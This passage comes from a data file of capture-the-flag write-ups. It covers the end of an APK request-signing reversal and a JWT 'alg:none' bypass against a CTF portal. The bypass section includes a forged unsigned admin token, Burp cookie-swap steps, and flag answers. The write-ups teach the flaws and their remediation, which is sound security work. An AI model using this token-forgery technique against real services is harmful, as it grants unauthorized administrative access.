returned:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code>FAM{x_s1gn4tur3_r3v3rs3d_n1c3ly}\n</code></pre></div>\n<h2>Root cause</h2>\n<p>The request-signing scheme relied entirely on <strong>security through obscurity of an algorithm embedded in a distributable client binary</strong>. There was no server-held secret that an attacker couldn't also obtain:</p>\n<ul>\n<li>The \"key\" (the 19-byte XOR table) and every constant needed to compute a valid signature were shipped inside the APK itself.</li>\n<li>Because the client \u2014 not the server \u2014 holds the actual \"proof of identity\" logic, anyone who can read the APK can reproduce every credential it's capable of producing, including ones for usernames the legitimate app UI never lets you pick (like <code>admin</code>).</li>\n<li>A custom, home-rolled signing scheme (however cleverly built from real hash primitives) provides no cryptographic authentication guarantee when the entire computation \u2014 key included \u2014 is available to the client running it.</li>\n</ul>\n<h2>Takeaways / remediation</h2>\n<ul>\n<li>Never embed a symmetric signing key (or a deterministic algorithm that behaves like one) in a mobile client. Anything shipped in the APK should be treated as fully public.</li>\n<li>Authentication/authorization decisions like \"is this user allowed to be <code>admin</code>\" must be enforced server-side against a real identity provider (e.g. checked against the already-established Firebase Auth session), not inferred from a client-supplied, client-signed field.</li>\n<li>If message-signing is required (e.g. to prevent tampering with a request from a legitimate, already-authenticated client), sign with a server-issued, short-lived token tied to the authenticated session \u2014 never with a static secret baked into the binary.</li>\n<li>Reusing the same obfuscation table across multiple unrelated protections (App Check debug token <em>and</em> API signing, in this case) means breaking one breaks all of them \u2014 key material should never be reused across independent security boundaries.</li>\n</ul>"}, {"num": "05", "id": "the-vault-door", "title": "THE VAULT DOOR", "category": "Web", "icon": "\ud83c\udf10", "path": "/home/claude/fampay/Fampay/Web/THE_VAULT_DOOR/README.md", "target": "ctf.fampay.co/famctf/", "flag": "FAM{jwt_4lg_n0n3_byp4ss_gr4nt3d}", "body_html": "<p><strong>Category:</strong> Web Exploitation | <strong>Difficulty:</strong> \u2605\u2605\u2605\u2606\u2606 (350 pts)</p>\n<hr />\n<h2>Challenge Description</h2>\n<blockquote class=\"desc-box\">\n<p>NexaVault is an internal credential management portal. Only administrators can open the Vault \u2014 a restricted area holding classified project data. You have been given access to create an account. That's it.</p>\n</blockquote>\n<p>Target: <code>https://ctf.fampay.co/famctf/</code></p>\n<hr />\n<h2>Recon</h2>\n<p>Registered a normal account. Login set a cookie <code>nx_access</code>, which was a JWT rather than an opaque session ID:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJNYW5hbiIsInJvbGUiOiJ1c2VyIn0...\n</code></pre></div>\n<p><strong>Header:</strong> <code>{\"alg\":\"HS256\",\"typ\":\"JWT\"}</code>\n<strong>Payload:</strong> <code>{\"sub\":\"Manan\",\"role\":\"user\"}</code></p>\n<p>The app decides access purely from the <code>role</code> claim in this client-held token. The dashboard confirmed it \u2014 Vault link greyed out, \"Admin Vault\" resource marked <code>Admin only</code>.</p>\n<hr />\n<h2>Exploitation</h2>\n<p><strong>Attempt 1 \u2014 failed.</strong> Edited payload to <code>role:admin</code>, kept an arbitrary signature. Fails: HS256 is an HMAC signed server-side with a secret; tampering the payload invalidates the signature, and you can't forge a new one without the key.</p>\n<p><strong>Attempt 2 \u2014 worked.</strong> The <code>alg</code> header is attacker-controlled and isn't cryptographically bound to anything. If the server trusts <code>alg</code> from the incoming token and accepts <code>none</code>, it skips signature verification entirely.</p>\n<p>Using jwt.io's encoder:</p>\n<p><strong>Header:</strong> <code>{\"alg\":\"none\",\"typ\":\"JWT\"}</code>\n<strong>Payload:</strong> <code>{\"sub\":\"Mananm\",\"role\":\"admin\"}</code></p>\n<p>This produces an RFC 7519 \u00a76 \"Unsecured JWT\" \u2014 <code>header.payload.</code> with an empty signature segment:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJNYW5hbm0iLCJyb2xlIjoiYWRtaW4ifQ.\n</code></pre></div>\n<p><strong>Delivery:</strong>\n1. Intercepted a request to <code>/famctf/dashboard</code> in Burp, swapped <code>nx_access</code> for the forged token.\n2. Server accepted it, no signature check \u2192 dashboard shows <code>ADMIN</code> badge, all resources <code>Granted</code>.\n3. Replayed the same cookie against <code>/famctf/admin</code> \u2192 Vault unlocked, flag displayed.</p>\n<hr />\n<h2>Root Cause</h2>\n<p><strong>CWE-347: Improper Verification of Cryptographic Signature.</strong> The backend selects its verification logic based on the <code>alg</code> field of the incoming (attacker-controlled) token instead of enforcing one fixed algorithm server-side. Since <code>none</code> was accepted, any payload \u2014 including elevated roles \u2014 could be forged with zero knowledge of the signing secret. This is the classic 2015-era <code>alg:none</code> JWT bug; modern libraries now reject <code>none</code> by default and require explicit algorithm allow-listing.</p>\n<hr />\n<h2>Remediation</h2>\n<ul>\n<li>Hardcode accepted algorithms server-side (e.g. <code>algorithms=[\"HS256\"]</code>), reject everything else including <code>none</code>.</li>\n<li>Never let the token's own header decide how it's verified.</li>\n<li>Treat JWT claims as untrusted until signature verification passes on every protected route.</li>\n</ul>"}];
